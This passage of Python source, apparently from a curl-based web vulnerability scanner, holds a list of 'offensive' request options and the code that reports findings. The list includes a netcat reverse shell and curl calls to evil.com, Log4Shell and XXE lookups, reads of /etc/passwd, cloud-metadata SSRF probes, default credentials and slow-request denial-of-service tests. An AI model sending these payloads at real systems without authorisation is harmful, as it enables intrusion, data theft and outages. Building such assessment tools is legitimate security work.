            (["--request", "CHECKOUT"], "method_checkout", "CHECKOUT method", "Tests checkout lock"),
            (["--request", "CHECKIN"], "method_checkin", "CHECKIN method", "Tests checkin versioning"),
            (["--request", "UNCHECKOUT"], "method_uncheckout", "UNCHECKOUT method", "Tests uncheckout"),
            (["--request", "REPORT"], "method_report", "REPORT method", "Tests information disclosure"),
            (["--request", "VERSION-CONTROL"], "method_version", "VERSION-CONTROL", "Tests version control"),
            (["--request", "MERGE"], "method_merge", "MERGE method", "Tests merge conflicts"),
            (["--request", "BIND"], "method_bind", "BIND method", "Tests bind attacks"),
            (["--request", "REBIND"], "method_rebind", "REBIND method", "Tests rebind attacks"),
            (["--request", "UNBIND"], "method_unbind", "UNBIND method", "Tests unbind attacks"),
            (["--header", "Content-Type: application/x-www-form-urlencoded"], "ct_form_normal", "Form content type", "Tests form parsing"),
            (["--header", "Content-Type: application/x-www-form-urlencoded; boundary=foo"], "ct_form_boundary", "Form with boundary", "Tests boundary injection"),
            (["--header", "Content-Type: multipart/form-data; boundary=---; charset=utf-8"], "ct_multipart", "Multipart charset", "Tests charset attacks"),
            (["--header", "Content-Type: application/json; version=1"], "ct_json_version", "JSON with version", "Tests JSON version injection"),
            (["--header", "Content-Type: text/plain; foo=bar; bar=foo"], "ct_text_params", "Text with params", "Tests parameter injection"),
            (["--header", "Content-Type: application/octet-stream"], "ct_octet", "Octet-stream", "Tests binary handling"),
            (["--header", "Content-Type: multipart/mixed"], "ct_multipart_mixed", "Multipart mixed", "Tests mixed multipart"),
            (["--header", "Content-Type: application/x-www-form-urlencoded; charset=utf-8"], "ct_form_utf8", "Form UTF-8", "Tests UTF-8 form handling"),
            (["--header", "Content-Type: application/xml"], "ct_xml", "XML content", "Tests XML handling"),
            (["--header", "Content-Type: text/xml"], "ct_text_xml", "Text XML", "Tests text XML handling"),
            (["--header", "X-Custom-Header: value1, value2, value3"], "x_custom_list", "List header", "Tests list parsing"),
            (["--header", "X-Custom-Header: value1;q=0.9, value2;q=0.1"], "x_custom_q", "Quality values", "Tests quality parsing"),
            (["--header", "X-Custom-Header: \"quoted value\""], "x_custom_quoted", "Quoted header", "Tests quoted strings"),
            (["--header", "X-Custom-Header: value with spaces"], "x_custom_spaces", "Spaces in header", "Tests whitespace"),
            (["--header", "X-Custom-Header: value\nvalue"], "x_custom_newline", "Newline in header", "Tests newline injection"),
            (["--header", "X-Custom-Header: value\r\nvalue"], "x_custom_crlf", "CRLF in header", "Tests CRLF injection"),
            (["--user", "admin:admin"], "auth_admin", "Admin:Admin", "Tests admin credentials"),
            (["--user", "admin:password"], "auth_admin_pass", "Admin:Password", "Tests common password"),
            (["--user", "root:root"], "auth_root", "Root:Root", "Tests root credentials"),
            (["--user", "root:toor"], "auth_root_toor", "Root:Toor", "Tests root variant"),
            (["--user", "admin:" + "A"*1000], "auth_admin_long", "Admin long password", "Tests long password overflow"),
            (["--user", "admin:admin", "--basic"], "auth_basic_admin", "Basic admin", "Tests basic auth bypass"),
            (["--header", "Authorization: Bearer " + "A"*10000], "auth_bearer_long", "Long bearer token", "Tests bearer overflow"),
            (["--header", "Authorization: Bearer 0"], "auth_bearer_zero", "Bearer 0", "Tests zero token"),
            (["--header", "Authorization: Bearer null"], "auth_bearer_null", "Bearer null", "Tests null token"),
            (["--header", "Authorization: Bearer undefined"], "auth_bearer_undefined", "Bearer undefined", "Tests undefined token"),
            (["--header", "Authorization: Bearer false"], "auth_bearer_false", "Bearer false", "Tests false token"),
            (["--header", "Authorization: Bearer true"], "auth_bearer_true", "Bearer true", "Tests true token"),
            (["--header", "Authorization: Bearer []"], "auth_bearer_array", "Bearer array", "Tests array injection"),
            (["--header", "Authorization: Bearer {}"], "auth_bearer_object", "Bearer object", "Tests object injection"),
            (["--cookie", "session=admin"], "cookie_admin", "Admin session", "Tests admin cookie"),
            (["--cookie", "session=root"], "cookie_root", "Root session", "Tests root cookie"),
            (["--cookie", "session=privileged"], "cookie_privileged", "Privileged session", "Tests privileged cookie"),
            (["--cookie", "session=1"], "cookie_one", "Cookie 1", "Tests integer true"),
            (["--cookie", "session=0"], "cookie_zero", "Cookie 0", "Tests integer false"),
            (["--cookie", "session=true"], "cookie_true", "Cookie true", "Tests boolean true"),
            (["--cookie", "session=false"], "cookie_false", "Cookie false", "Tests boolean false"),
            (["--cookie", "session=null"], "cookie_null", "Cookie null", "Tests null cookie"),
            (["--cookie", "session=undefined"], "cookie_undefined", "Cookie undefined", "Tests undefined cookie"),
            (["--cookie", "session=[]"], "cookie_array", "Cookie array", "Tests array injection"),
            (["--cookie", "session={}"], "cookie_object", "Cookie object", "Tests object injection"),
            (["--cookie", "session=; Domain=example.com"], "cookie_domain", "Cookie domain", "Tests domain spoofing"),
            (["--cookie", "session=; Path=/admin"], "cookie_path", "Cookie path", "Tests path escalation"),
            (["--cookie", "session=; HttpOnly"], "cookie_httponly", "Cookie HttpOnly", "Tests HttpOnly bypass"),
            (["--cookie", "session=; Secure"], "cookie_secure", "Cookie Secure", "Tests Secure bypass"),
            (["--cookie", "session=; SameSite=None"], "cookie_samesite_none", "SameSite None", "Tests SameSite bypass"),
            (["--cookie", "session=; SameSite=Lax"], "cookie_samesite_lax", "SameSite Lax", "Tests Lax bypass"),
            (["--cookie", "session=; SameSite=Strict"], "cookie_samesite_strict", "SameSite Strict", "Tests Strict bypass"),
            (["--cookie", "session=; Max-Age=0"], "cookie_max_age_0", "Max-Age 0", "Tests immediate expiration"),
            (["--cookie", "session=; Expires=Thu, 01 Jan 1970 00:00:00 GMT"], "cookie_expires_1970", "Expires 1970", "Tests epoch expiration"),
            (["--cookie", "session=; Expires=Thu, 01 Jan 2038 00:00:00 GMT"], "cookie_expires_2038", "Expires 2038", "Tests Y2K38 vulnerability"),
            (["--cookie", "session=; Domain=.example.com"], "cookie_domain_dot", "Domain with dot", "Tests domain validation"),
            (["--cookie", "session=; Domain=example.com; Path=/; Secure; HttpOnly"], "cookie_full", "All flags", "Tests complete injection"),
            (["--cookie", "session=" + "A"*100000], "cookie_100k_value", "100k cookie", "Tests 100KB cookie"),
            (["--insecure"], "insecure", "Skip SSL verification", "Tests SSL bypass"),
            (["--tlsv1.0"], "tls_1_0", "TLS 1.0", "Tests TLS 1.0 vulnerabilities"),
            (["--tlsv1.1"], "tls_1_1", "TLS 1.1", "Tests TLS 1.1 vulnerabilities"),
            (["--no-tlsv1.2", "--no-tlsv1.3"], "no_tls_strong", "No TLS 1.2/1.3", "Tests TLS downgrade"),
            (["--ciphers", "ALL:!aNULL:!eNULL:!LOW:!MEDIUM:!HIGH:!RC4:!MD5"], "cipher_all", "All ciphers", "Tests weak ciphers"),
            (["--ciphers", "DEFAULT:!DH"], "cipher_no_dh", "No DH", "Tests DH exclusion"),
            (["--ciphers", "NULL"], "cipher_null", "Null cipher", "Tests null cipher"),
            (["--ciphers", "aNULL"], "cipher_anonymous", "Anonymous cipher", "Tests anonymous"),
            (["--ciphers", "eNULL"], "cipher_empty", "Empty cipher", "Tests empty cipher"),
            (["--ciphers", "EXPORT"], "cipher_export", "Export cipher", "Tests export cipher"),
            (["--ciphers", "EXPORT40"], "cipher_export40", "40-bit export", "Tests 40-bit weak"),
            (["--ciphers", "EXPORT56"], "cipher_export56", "56-bit export", "Tests 56-bit weak"),
            (["--ciphers", "RC4"], "cipher_rc4", "RC4 cipher", "Tests RC4 vulnerability"),
            (["--ciphers", "MD5"], "cipher_md5", "MD5 cipher", "Tests MD5 vulnerability"),
            (["--ciphers", "DES"], "cipher_des", "DES cipher", "Tests DES vulnerability"),
            (["--ciphers", "3DES"], "cipher_3des", "3DES cipher", "Tests 3DES vulnerability"),
            (["--ciphers", "DHE"], "cipher_dhe", "DHE cipher", "Tests DHE vulnerability"),
            (["--ciphers", "ECDHE"], "cipher_ecdhe", "ECDHE cipher", "Tests ECDHE vulnerability"),
            (["--ciphers", "RSA"], "cipher_rsa", "RSA cipher", "Tests RSA vulnerability"),
            (["--ciphers", "DSS"], "cipher_dss", "DSS cipher", "Tests DSS vulnerability"),
            (["--ciphers", "ECDSA"], "cipher_ecdsa", "ECDSA cipher", "Tests ECDSA vulnerability"),
            (["--ciphers", "PSK"], "cipher_psk", "PSK cipher", "Tests PSK vulnerability"),
            (["--ciphers", "SRP"], "cipher_srp", "SRP cipher", "Tests SRP vulnerability"),
            (["--ciphers", "DEFAULT@SECLEVEL=1"], "cipher_seclevel1", "Security level 1", "Tests level 1 bypass"),
            (["--ciphers", "DEFAULT@SECLEVEL=0"], "cipher_seclevel0", "Security level 0", "Tests min security"),
            (["--proxy", "http://malicious-proxy.com:8080"], "proxy_malicious", "Malicious proxy", "Tests MITM proxy"),
            (["--proxy", "socks4://malicious-proxy.com:1080"], "proxy_socks4", "SOCKS4 proxy", "Tests SOCKS4 abuse"),
            (["--proxy", "socks5://malicious-proxy.com:1080"], "proxy_socks5", "SOCKS5 proxy", "Tests SOCKS5 abuse"),
            (["--proxy-user", "admin:admin"], "proxy_auth_admin", "Proxy admin auth", "Tests proxy admin bypass"),
            (["--proxy-user", "root:root"], "proxy_auth_root", "Proxy root auth", "Tests proxy root bypass"),
            (["--no-proxy"], "no_proxy_bypass", "Bypass proxy", "Tests proxy bypass"),
            (["--dns-servers", "0.0.0.0"], "dns_zero", "Zero DNS", "Tests DNS poisoning"),
            (["--dns-servers", "255.255.255.255"], "dns_broadcast", "Broadcast DNS", "Tests broadcast DNS"),
            (["--resolve", "example.com:80:127.0.0.1"], "resolve_local_poison", "Local poison", "Tests DNS cache poisoning"),
            (["--resolve", "example.com:443:127.0.0.1"], "resolve_local_poison_ssl", "SSL poison", "Tests SSL DNS poisoning"),
            (["--resolve", "example.com:80:0.0.0.0"], "resolve_zero", "Zero resolution", "Tests zero IP"),
            (["--resolve", "example.com:80:255.255.255.255"], "resolve_broadcast", "Broadcast resolution", "Tests broadcast IP"),
            (["--header", "Host: 127.0.0.1"], "host_local", "Host localhost", "Tests localhost injection"),
            (["--header", "Host: 0.0.0.0"], "host_zero", "Host zero", "Tests zero host"),
            (["--header", "Host: localhost"], "host_localhost", "Host localhost", "Tests localhost"),
            (["--header", "Host: internal.example.com"], "host_internal", "Host internal", "Tests internal domain"),
            (["--header", "Host: admin.example.com"], "host_admin", "Host admin", "Tests admin domain"),
            (["--header", "Host: " + "A"*1000], "host_1000", "1k host", "Tests 1KB host overflow"),
            (["--header", "Host: " + "A"*1048576], "host_1mb", "1MB host", "Tests 1MB host DoS"),
            (["--limit-rate", "1", "--data", "a=b"], "slow_post", "Slow POST", "Tests slowloris"),
            (["--limit-rate", "10", "--data", "@/dev/zero"], "infinite_upload", "Infinite upload", "Tests infinite upload"),
            (["--limit-rate", "100", "--header", "Expect: 100-continue", "--data", "@/dev/zero"], "slow_100_continue", "Slow 100-continue", "Tests slow 100-continue"),
            (["--header", "Content-Length: 999999999", "--data", "small"], "cl_mismatch", "CL mismatch", "Tests CL mismatch"),
            (["--header", "Content-Length: 1", "--data", "THISISLARGER"], "cl_under", "CL under", "Tests under-specified CL"),
            (["--header", "Transfer-Encoding: chunked", "--data", "100000\\r\\n" + "A"*100000 + "\\r\\n0\\r\\n\\r\\n"], "te_chunked_large", "Large chunked", "Tests 100KB chunked"),
            (["--connect-timeout", "1", "--max-time", "3600"], "hang_long", "Long hanging", "Tests 1-hour hanging"),
            (["--max-time", "0"], "timeout_infinite", "Infinite timeout", "Tests infinite timeout"),
            (["--connect-timeout", "0"], "conn_timeout_infinite", "Infinite connect", "Tests infinite connect"),
            (["--retry", "999999"], "retry_infinite", "Infinite retries", "Tests infinite retries"),
            (["--retry-delay", "0", "--retry", "999999"], "retry_infinite_fast", "Fast infinite retries", "Tests rapid retry DoS"),
            (["--limit-rate", "1", "--max-time", "3600", "--data", "@/dev/zero"], "slow_dos", "Slow DOS", "Tests slow DoS"),
            (["--header", "Content-Length: 0", "--data", "FOO"], "cl_zero_with_data", "Zero CL with data", "Tests CL inconsistency"),
            (["--data", "\x00"*1000], "data_null_1k", "1k null bytes", "Tests null byte injection"),
            (["--data", "\x00"*10000], "data_null_10k", "10k null bytes", "Tests 10KB null injection"),
            (["--data", "\xFF"*1000], "data_ff_1k", "1k FF bytes", "Tests FF byte injection"),
            (["--data", "\xFF"*10000], "data_ff_10k", "10k FF bytes", "Tests 10KB FF injection"),
            (["--data", "\r\n"*100000], "data_crlf_100k", "100k CRLF", "Tests 100KB CRLF injection"),
            (["--data", "\n"*100000], "data_lf_100k", "100k LF", "Tests 100KB line feed"),
            (["--data", "\t"*100000], "data_tab_100k", "100k tabs", "Tests 100KB tab injection"),
            (["--data", "A"*100000 + "\x00" + "B"*100000], "data_null_mixed", "Mixed null bytes", "Tests mixed null injection"),
            (["--data", "A"*1000000], "data_1mb", "1MB data", "Tests 1MB data injection"),
            (["--data", "A"*10000000], "data_10mb", "10MB data", "Tests 10MB data injection"),
            (["--header", "X-Custom-Header: <script>alert(1)</script>"], "xss_header", "XSS header", "Tests XSS in headers"),
            (["--header", "X-Custom-Header: {{7*7}}"], "ssti_header", "SSTI header", "Tests SSTI in headers"),
            (["--header", "X-Custom-Header: ${jndi:ldap://evil.com}"], "log4j_header", "Log4J header", "Tests Log4J vulnerability"),
            (["--header", "X-Custom-Header: #{7*7}"], "el_injection", "EL injection", "Tests EL injection"),
            (["--header", "X-Custom-Header: ${7*7}"], "jsp_el_injection", "JSP EL injection", "Tests JSP EL injection"),
            (["--header", "X-Custom-Header: ${{7*7}}"], "js_template", "JS template injection", "Tests JS template injection"),
            (["--header", "X-AWS-EC2-Metadata: true"], "aws_metadata", "AWS metadata", "Tests AWS metadata access"),
            (["--header", "X-Google-Metadata: true"], "gcp_metadata", "GCP metadata", "Tests GCP metadata access"),
            (["--header", "X-Azure-Metadata: true"], "azure_metadata", "Azure metadata", "Tests Azure metadata access"),
            (["--header", "X-Kubernetes-Metadata: true"], "k8s_metadata", "K8s metadata", "Tests Kubernetes metadata"),
            (["--header", "X-Kubernetes-Service-Account: true"], "k8s_service_account", "K8s SA", "Tests K8s service account"),
            (["--header", "X-Docker-API-Version: 1.41"], "docker_api", "Docker API", "Tests Docker API access"),
            (["--header", "X-Docker-Request: true"], "docker_request", "Docker request", "Tests Docker requests"),
            (["--header", "X-Service-Account: true"], "service_account", "Service account", "Tests service account access"),
            (["--header", "X-Jenkins-Crumb: true"], "jenkins_crumb", "Jenkins crumb", "Tests Jenkins CSRF"),
            (["--header", "X-Jenkins-Auth: true"], "jenkins_auth", "Jenkins auth", "Tests Jenkins auth"),
            (["--header", "X-GitHub-Event: push"], "github_event", "GitHub event", "Tests GitHub webhook"),
            (["--header", "X-GitLab-Event: push"], "gitlab_event", "GitLab event", "Tests GitLab webhook"),
            (["--header", "X-CircleCI-Event: true"], "circleci_event", "CircleCI event", "Tests CircleCI webhook"),
            (["--header", "X-Travis-Event: true"], "travis_event", "Travis CI event", "Tests Travis CI webhook"),
            (["--header", "X-File-Include: /etc/passwd"], "file_include", "File include", "Tests file inclusion"),
            (["--header", "X-File-Read: /etc/passwd"], "file_read", "File read", "Tests file read"),
            (["--header", "X-File-Write: /tmp/evil.txt"], "file_write", "File write", "Tests file write"),
            (["--header", "X-File-Delete: /tmp/evil.txt"], "file_delete", "File delete", "Tests file delete"),
            (["--header", "X-Forwarded-For: 169.254.169.254"], "ssrf_aws", "SSRF AWS", "Tests AWS SSRF"),
            (["--header", "X-Forwarded-For: metadata.google.internal"], "ssrf_gcp", "SSRF GCP", "Tests GCP SSRF"),
            (["--header", "X-Forwarded-For: 100.100.100.200"], "ssrf_azure", "SSRF Azure", "Tests Azure SSRF"),
            (["--header", "X-Forwarded-For: 127.0.0.1:8080"], "ssrf_local", "SSRF local", "Tests local SSRF"),
            (["--header", "X-Command: whoami"], "cmd_injection", "Command injection", "Tests command injection"),
            (["--header", "X-Command: id"], "cmd_id", "Command id", "Tests id command"),
            (["--header", "X-Command: cat /etc/passwd"], "cmd_cat", "Command cat", "Tests cat command"),
            (["--header", "X-Command: curl evil.com"], "cmd_curl", "Command curl", "Tests curl command"),
            (["--header", "X-Command: nc -e /bin/sh evil.com"], "cmd_nc", "Command nc", "Tests netcat reverse shell"),
            (["--header", "X-Deserialization: O:8:\"stdClass\":1:{s:1:\"a\";s:1:\"b\";}"], "deserialization", "Deserialization", "Tests deserialization"),
            (["--header", "X-Deserialization: O:7:\"User\":2:{s:8:\"username\";s:5:\"admin\";s:8:\"password\";s:8:\"password\";}"], "deserialization_user", "User deserialization", "Tests user deserialization"),
            (["--header", "X-Deserialization: a:2:{i:0;s:4:\"test\";i:1;s:4:\"test\";}"], "deserialization_array", "Array deserialization", "Tests array deserialization"),
            (["--header", "X-XML: <xml><test>test</test></xml>"], "xxe_injection", "XXE injection", "Tests XXE injection"),
            (["--header", "X-XML: <!DOCTYPE test [<!ENTITY test SYSTEM \"file:///etc/passwd\">]>"], "xxe_file", "XXE file", "Tests XXE file read"),
            (["--header", "X-XML: <!DOCTYPE test [<!ENTITY test SYSTEM \"http://evil.com/xxe.dtd\">]>"], "xxe_remote", "XXE remote", "Tests XXE remote DTD"),
        ]
        
        for opts, name, desc, purpose in offensive_opts:
            commands.append(CurlCommand(opts, "offensive", name, desc, purpose))
        
        return commands

def display_commands_table(commands: List[CurlCommand], category: str, page: int = 1, per_page: int = 20):
    total = len(commands)
    total_pages = (total + per_page - 1) // per_page
    
    if page < 1:
        page = 1
    if page > total_pages:
        page = total_pages
    
    start = (page - 1) * per_page
    end = min(start + per_page, total)
    
    table = Table(title=f"{category.upper()} COMMANDS (Page {page}/{total_pages})", box=box.ROUNDED)
    table.add_column("#", style="cyan", no_wrap=True)
    table.add_column("Name", style="yellow", no_wrap=True)
    table.add_column("Purpose", style="white")
    table.add_column("Command Preview", style="green")
    
    for idx in range(start, end):
        cmd = commands[idx]
        cmd_str = " ".join(cmd.cmd)
        if len(cmd_str) > 40:
            cmd_str = cmd_str[:37] + "..."
        table.add_row(
            str(idx + 1), 
            cmd.name, 
            cmd.test_purpose[:50] + ("..." if len(cmd.test_purpose) > 50 else ""),
            cmd_str
        )
    
    console.print(table)
    console.print(f"\n[cyan]Showing {start+1}-{end} of {total} commands[/cyan]")
    console.print(f"[cyan]Page {page}/{total_pages} | [N]ext [P]revious [Q]uit[/cyan]")
    console.print("[cyan]Enter numbers (e.g., '1,2,3' or '1-5' or 'all') to select[/cyan]")
    
    return total_pages

def select_specific_commands(commands: List[CurlCommand], category: str) -> List[CurlCommand]:
    selected = []
    page = 1
    total_pages = display_commands_table(commands, category, page)
    
    while True:
        choice = Prompt.ask(
            "\n[cyan]Enter command selection[/cyan]",
            default="q"
        )
        
        if choice.lower() == 'q':
            return []
        
        if choice.lower() == 'n':
            if page < total_pages:
                page += 1
                total_pages = display_commands_table(commands, category, page)
            else:
                console.print("[yellow]Already on last page[/yellow]")
            continue
        
        if choice.lower() == 'p':
            if page > 1:
                page -= 1
                total_pages = display_commands_table(commands, category, page)
            else:
                console.print("[yellow]Already on first page[/yellow]")
            continue
        
        try:
            if choice.lower() == 'all':
                return commands
            
            indices = set()
            parts = choice.split(',')
            for part in parts:
                part = part.strip()
                if '-' in part:
                    start_num, end_num = part.split('-')
                    for i in range(int(start_num)-1, int(end_num)):
                        if 0 <= i < len(commands):
                            indices.add(i)
                else:
                    i = int(part) - 1
                    if 0 <= i < len(commands):
                        indices.add(i)
            
            if not indices:
                console.print("[red]No valid commands selected[/red]")
                continue
            
            selected = [commands[i] for i in sorted(indices)]
            console.print(f"[green]Selected {len(selected)} commands[/green]")
            return selected
            
        except ValueError:
            console.print("[red]Invalid selection. Use numbers (1,2,3), range (1-5), 'all', 'n', 'p', or 'q'[/red]")
            continue

def display_finding_detail(finding: Finding) -> Panel:
    severity_color = {
        Severity.CRITICAL: "red",
        Severity.HIGH: "red",
        Severity.MEDIUM: "yellow",
        Severity.LOW: "blue",
        Severity.INFO: "cyan"
    }.get(finding.severity, "white")
    
    content = f"""
[bold {severity_color}]⚠ {finding.severity.value}: {finding.title}[/bold {severity_color}]

[b]CWE ID:[/b] {finding.cwe_id}
[b]Command:[/b] {finding.command_name}
[b]Risk Score:[/b] {finding.risk_score:.1f}/10.0
[b]Confidence:[/b] {finding.confidence}
[b]Likelihood:[/b] {finding.likelihood}

[b]Description:[/b]
{finding.description}

[b]Impact:[/b]
{finding.impact}

[b]Evidence:[/b]
{finding.evidence}

[b]Recommended Action:[/b]
{finding.recommended_action}

[b]Remediation:[/b]
{finding.remediation}
"""
    
    return Panel(
        content,
        title=f"[bold {severity_color}]FINDING[/bold {severity_color}]",
        border_style=severity_color,
        padding=(1, 2)
    )

def sanitize_filename(filename: str) -> str:
    sanitized = re.sub(r'[^a-zA-Z0-9_-]', '_', filename)
    sanitized = re.sub(r'_+', '_', sanitized)
    sanitized = sanitized.strip('_')
    return sanitized

def display_results(results: List[ScanResult], target: str):
    console.print("\n" + "="*100)
    console.print(Align.center("[bold cyan]▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀[/bold cyan]"))
    console.print(Align.center("[bold cyan]                    COMPREHENSIVE ASSESSMENT RESULTS[/bold cyan]"))
    console.print(Align.center("[bold cyan]▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄[/bold cyan]"))
    console.print("="*100)
    
    total_findings = sum(len(r.findings) for r in results)
    critical_count = sum(1 for r in results for f in r.findings if f.severity == Severity.CRITICAL)
    high_count = sum(1 for r in results for f in r.findings if f.severity == Severity.HIGH)
    medium_count = sum(1 for r in results for f in r.findings if f.severity == Severity.MEDIUM)
    low_count = sum(1 for r in results for f in r.findings if f.severity == Severity.LOW)
    info_count = sum(1 for r in results for f in r.findings if f.severity == Severity.INFO)
    
    risk_scores = []
    for r in results:
        for f in r.findings:
            risk_scores.append(f.risk_score)
    
    avg_risk = sum(risk_scores) / len(risk_scores) if risk_scores else 0
    max_risk = max(risk_scores) if risk_scores else 0
    
    summary_content = f"""
[b cyan]Target:[/b cyan] {target}
[b cyan]Tests Executed:[/b cyan] {len(results)}
[b cyan]Total Findings:[/b cyan] {total_findings}
[b cyan]Average Risk Score:[/b cyan] {avg_risk:.1f}/10.0
[b cyan]Maximum Risk Score:[/b cyan] {max_risk:.1f}/10.0

[b]Findings by Severity:[/b]
  [red]● CRITICAL:[/red] {critical_count}
  [red]● HIGH:[/red] {high_count}
  [yellow]● MEDIUM:[/yellow] {medium_count}
  [blue]● LOW:[/blue] {low_count}
  [cyan]● INFO:[/cyan] {info_count}

[b]Overall Risk Level:[/b] {"CRITICAL" if max_risk >= 8 else "HIGH" if max_risk >= 6 else "MEDIUM" if max_risk >= 4 else "LOW" if max_risk >= 2 else "INFO" if max_risk > 0 else "NONE"}
"""
    
    console.print(Panel(
        summary_content,
        title="[bold green]EXECUTIVE SUMMARY[/bold green]",
        border_style="green",
        padding=(1, 2)
    ))
    
    console.print(Rule("[bold cyan]DETAILED TEST RESULTS[/bold cyan]"))
    
    all_output = ""
    for idx, result in enumerate(results, 1):
        status_color = "green" if result.status == "PASS" else "red" if result.status == "FAIL" else "yellow"
        category_color = "green" if result.command.category == "defensive" else "red"
        
        result_content = f"""
╔═══════════════════════════════════════════════════════════════════════════════╗
║ TEST #{idx}/{len(results)}                                                       ║
╚═══════════════════════════════════════════════════════════════════════════════╝

[b]Command Name:[/b] {result.command.name}
[b]Category:[/b] [{category_color}]{result.command.category.upper()}[/{category_color}]
[b]Purpose:[/b] {result.command.test_purpose}
[b]Status:[/b] [{status_color}]{result.status}[/{status_color}]
[b]Exit Code:[/b] {result.exit_code}
[b]Duration:[/b] {result.duration:.3f}s
[b]Payload Size:[/b] {result.payload_size:,} bytes
[b]HTTP Status:[/b] {result.http_status if result.http_status else 'N/A'}
[b]Vulnerability Detected:[/b] {"[red]YES[/red]" if result.vulnerability_detected else "[green]NO[/green]"}
[b]Risk Level:[/b] {result.risk_level}

┌─────────────────────────────────────────────────────────────────────────────┐
│ FULL COMMAND OUTPUT                                                         │
└─────────────────────────────────────────────────────────────────────────────┘

[b cyan]STDOUT (Full Response):[/b cyan]
{result.stdout if result.stdout else '[EMPTY]'}

[b yellow]STDERR (Full Error Output):[/b yellow]
{result.stderr if result.stderr else '[NONE]'}

┌─────────────────────────────────────────────────────────────────────────────┐
│ FULL RESPONSE HEADERS                                                       │
└─────────────────────────────────────────────────────────────────────────────┘
"""
        
        if result.response_headers:
            for key, value in result.response_headers.items():
                result_content += f"\n  [yellow]{key}:[/yellow] {value}"
        else:
            result_content += "\n  [dim]No headers received[/dim]"
        
        if result.ssl_info:
            result_content += f"\n\n┌─────────────────────────────────────────────────────────────────────────────┐\n│ SSL/TLS INFORMATION                                                     │\n└─────────────────────────────────────────────────────────────────────────────┘\n"
            for key, value in result.ssl_info.items():
                result_content += f"\n  [yellow]{key}:[/yellow] {value}"
        
        result_content += f"\n\n[dim]{'='*80}[/dim]\n"
        
        if result.findings:
            result_content += f"\n[bold red]⚠ {len(result.findings)} FINDING(S) DETECTED[/bold red]\n"
            for find_idx, finding in enumerate(result.findings, 1):
                severity_color = {
                    Severity.CRITICAL: "red",
                    Severity.HIGH: "red",
                    Severity.MEDIUM: "yellow",
                    Severity.LOW: "blue",
                    Severity.INFO: "cyan"
                }.get(finding.severity, "white")
                
                result_content += f"""
[{severity_color}]● {finding.severity.value}: {finding.title}[/{severity_color}]
  CWE: {finding.cwe_id} | Risk Score: {finding.risk_score:.1f}/10.0
  Description: {finding.description[:200]}...
  Impact: {finding.impact}
  Remediation: {finding.remediation[:200]}...
"""
                if find_idx < len(result.findings):
                    result_content += "\n" + "-"*40 + "\n"
        
        all_output += result_content + "\n" + "="*100 + "\n\n"
    
    scrollable_output(all_output, "DETAILED RESULTS")
    
    console.print(Rule("[bold cyan]FINAL STATISTICS[/bold cyan]"))
    
    stats_table = Table(box=box.ROUNDED)
    stats_table.add_column("Metric", style="cyan")
    stats_table.add_column("Value", style="white")
    stats_table.add_column("Impact", style="yellow")
    
    stats_data = [
        ("Total Tests", len(results), "Assessment coverage"),
        ("Passed", sum(1 for r in results if r.status == "PASS"), "Expected behavior"),
        ("Failed", sum(1 for r in results if r.status == "FAIL"), "Unexpected issues"),
        ("Timeout", sum(1 for r in results if r.status == "TIMEOUT"), "Performance/availability"),
        ("Errors", sum(1 for r in results if r.status == "ERROR"), "System issues"),
        ("CRITICAL Findings", critical_count, "Immediate action required"),
        ("HIGH Findings", high_count, "Urgent attention needed"),
        ("MEDIUM Findings", medium_count, "Should be addressed"),
        ("LOW Findings", low_count, "Consider remediation"),
    ]
    
    for metric, value, impact in stats_data:
        color = "red" if "CRITICAL" in metric or "HIGH" in metric or value > 10 else "yellow" if "MEDIUM" in metric or value > 5 else "green"
        stats_table.add_row(metric, f"[{color}]{value}[/{color}]", impact)
    
    console.print(stats_table)
    
    if critical_count > 0 or high_count > 0:
        console.print(Panel(
            "[bold red]⚠ URGENT RECOMMENDATIONS[/bold red]\n\n"
            f"• {critical_count} CRITICAL and {high_count} HIGH risk findings detected.\n"
            "• Immediate action is required to address these vulnerabilities.\n"
            "• Review each finding's remediation steps carefully.\n"
            "• Consider pausing production deployment until critical issues are resolved.",
            title="[bold red]ACTION REQUIRED[/bold red]",
            border_style="red"
        ))
    elif medium_count > 0:
        console.print(Panel(
            "[bold yellow]⚠ RECOMMENDATIONS[/bold yellow]\n\n"
            f"• {medium_count} MEDIUM risk findings detected.\n"
            "• Plan to address these issues in the next development cycle.\n"
            "• Review security controls and implement improvements.",
            title="[bold yellow]PLANNED IMPROVEMENTS[/bold yellow]",
            border_style="yellow"
        ))
    else:
        console.print(Panel(
            "[bold green]✓ SECURITY STATUS[/bold green]\n\n"
            "• No significant vulnerabilities detected.\n"
            "• Maintain current security practices.\n"
            "• Continue regular security assessments.",
            title="[bold green]GOOD SECURITY POSTURE[/bold green]",
            border_style="green"
        ))
    
    try:
        os.makedirs("reports", exist_ok=True)
        os.chmod("reports", 0o755)
    except Exception as e:
        console.print(f"[yellow]Could not create reports directory: {e}. Using current directory.[/yellow]")
        os.makedirs(".", exist_ok=True)
    
    timestamp = int(time.time())
    sanitized_target = sanitize_filename(target.replace('https://', '').replace('http://', ''))
    
    try:
        json_file = f"reports/curloptix_{sanitized_target}_{timestamp}.json"
        txt_file = f"reports/curloptix_{sanitized_target}_{timestamp}.txt"
        csv_file = f"reports/curloptix_{sanitized_target}_{timestamp}.csv"
        
        report_data = {
            "target": target,
            "timestamp": datetime.now().isoformat(),
            "total_commands": len(results),
            "summary": {
                "total_tests": len(results),
                "total_findings": total_findings,
                "critical_count": critical_count,
                "high_count": high_count,
                "medium_count": medium_count,
                "low_count": low_count,
                "info_count": info_count,
                "average_risk_score": avg_risk,
                "max_risk_score": max_risk,
                "overall_risk_level": "CRITICAL" if max_risk >= 8 else "HIGH" if max_risk >= 6 else "MEDIUM" if max_risk >= 4 else "LOW" if max_risk >= 2 else "INFO" if max_risk > 0 else "NONE"
            },
            "results": [
                {
                    "command": r.command.name,
                    "category": r.command.category,
                    "purpose": r.command.test_purpose,
                    "status": r.status,
                    "exit_code": r.exit_code,
                    "duration": r.duration,
                    "http_status": r.http_status,
                    "vulnerability_detected": r.vulnerability_detected,
                    "risk_level": r.risk_level,
                    "stdout_full": r.stdout,
                    "stderr_full": r.stderr,
